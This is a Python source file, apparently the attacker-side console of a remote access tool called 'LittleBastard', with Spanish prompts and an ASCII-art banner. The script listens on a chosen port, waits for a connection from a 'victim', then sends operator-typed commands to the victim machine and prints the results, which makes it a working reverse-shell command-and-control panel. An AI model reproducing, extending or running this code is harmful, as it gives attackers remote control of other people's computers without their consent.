import os
import socket
import subprocess
import time
import colorama
from colorama import Fore, Style
colorama.init()

def banner():
    print(Fore.GREEN+"""
██▓     ██▓▄▄▄█████▓▄▄▄█████▓ ██▓    ▓█████                   
▓██▒    ▓██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓██▒    ▓█   ▀                   
▒██░    ▒██▒▒ ▓██░ ▒░▒ ▓██░ ▒░▒██░    ▒███                     
▒██░    ░██░░ ▓██▓ ░ ░ ▓██▓ ░ ▒██░    ▒▓█  ▄                   
░██████▒░██░  ▒██▒ ░   ▒██▒ ░ ░██████▒░▒████▒                  
░ ▒░▓  ░░▓    ▒ ░░     ▒ ░░   ░ ▒░▓  ░░░ ▒░ ░                  
░ ░ ▒  ░ ▒ ░    ░        ░    ░ ░ ▒  ░ ░ ░  ░                  
  ░ ░    ▒ ░  ░        ░        ░ ░      ░                     
    ░  ░ ░                        ░  ░   ░  ░                  
                                                               
 ▄▄▄▄    ▄▄▄        ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  ▓█████▄ 
▓█████▄ ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌
▒██▒ ▄██▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌
▒██░█▀  ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌
░▓█  ▀█▓ ▓█   ▓██▒▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒ 
 ░    ░   ░   ▒   ░  ░  ░    ░        ░   ▒     ░░   ░  ░ ░  ░ 
 ░            ░  ░      ░                 ░  ░   ░        ░    
      ░                                                 ░      """)

    welcome, creator = "[+] Bienvenido al Panel de LittleBastard\n", ("[*] Creado Por Shadow")

    for i in welcome:
        time.sleep(0.1)
        print(i, end='',flush=True)

    for i in creator:
        time.sleep(0.1)
        print(i, end='',flush=True)

banner()
print()
print()


lhost = input('[*] Ingresa Tu IP Local: ')
print()
lport = int(input('[*] Ingresa Tu Puerto Local: '))

try:
    servidor  = socket.socket()
    servidor.bind((lhost, lport))
    servidor.listen(1)
    print()
    print("\n[+] Esperando Conexion De la Victima...")
except OSError:
    print(f"[*] Ya existe una interfaz en escucha en el puerto {lport}")

connected = False

while True:
    if not connected:
        client, client_addr = servidor.accept()
        connected = True
    
    print()
    command = input(f"{Fore.CYAN}little@bastard >> {Fore.RESET}")
    command = command.encode()
    client.send(command)

    output = client.recv(1024)
    output = output.decode()
    print(f"""
{output}""")

    if output == "exit":
        break

    if not output:
        print("La victima cerro el archivo :( ")
        break

     
     

    
